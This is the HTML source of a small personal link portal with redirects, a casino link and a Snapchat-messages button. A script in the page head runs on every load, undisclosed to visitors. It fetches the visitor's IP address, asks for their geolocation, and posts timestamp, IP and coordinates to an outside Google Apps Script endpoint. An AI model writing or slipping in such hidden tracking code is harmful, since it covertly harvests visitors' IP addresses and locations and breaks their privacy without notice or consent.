<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="author" content="Miles">
    <meta charset="UTF-8">
    <title>Miles' Portal</title>
    <link rel="stylesheet" href="index.css">
    <style>
        .snap-btn {
            display: inline-block;
            padding: 10px 20px;
            background-color: #fffc00;
            color: black;
            text-decoration: none;
            font-weight: bold;
            border-radius: 5px;
            border: 1px solid #000;
            margin-top: 20px;
        }
    </style>
    <script>
        // ---------------- Redirects ----------------
        const path = window.location.pathname.toLowerCase();
        const redirects = {
            "/milescomp": "https://pcpartpicker.com/list/xmww2x",
            "/lethal": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "/nice": "nice.html",
            "/suggestions": "suggestions.html",
            "/admin": "admin.html",
            "/snap": "snapchatmessages.html"
        };

        if (redirects[path]) {
            window.location.href = redirects[path];
        }

        // ---------------- Location Tracking ----------------
        const SHEET_URL = "https://script.google.com/macros/s/AKfycbxMrkQjLGQlcMUB0bFcx5y5wkDvJKlkgd7uc9I8ojJcI1ibBkiKHf4Dl41Aj2yKJ9y_eQ/exec";

        function sendData(timestamp, ip, latitude, longitude) {
            const row = [timestamp, ip, latitude, longitude];
            fetch(SHEET_URL, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(row)
            })
            .catch(err => console.error("Error saving:", err));
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                return json.ip;
            } catch (e) { return null; }
        }

        function collectAndSendTracking() {
            (async () => {
                const ip = await getIP();
                const timestamp = new Date().toISOString();
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        sendData(timestamp, ip, pos.coords.latitude, pos.coords.longitude);
                    }, () => sendData(timestamp, ip, null, null));
                } else {
                    sendData(timestamp, ip, null, null);
                }
            })();
        }
        collectAndSendTracking();
    </script>
</head>
<body>
    <h1>Welcome To The Portal</h1>
    <p>By: Miles</p>
    
    <label for="filter">Filter Links</label>
    <select id="filter" onchange="filterLinks(this.value)">
        <option value="all">All</option>
        <option value="miles">Miles</option>
        <option value="other">Other</option>
    </select>

    <div class="links">
        <a href="https://milesbman.com/casino" class="link miles">Casino</a>
    </div>

    <footer>
        <br>
        <a class="Sbutton" href="suggestions.html">Suggestions</a>
        <br>
        <a href="snapchatmessages.html" class="snap-btn">Go to Snapchat Messages</a>
    </footer>
</body>
</html>
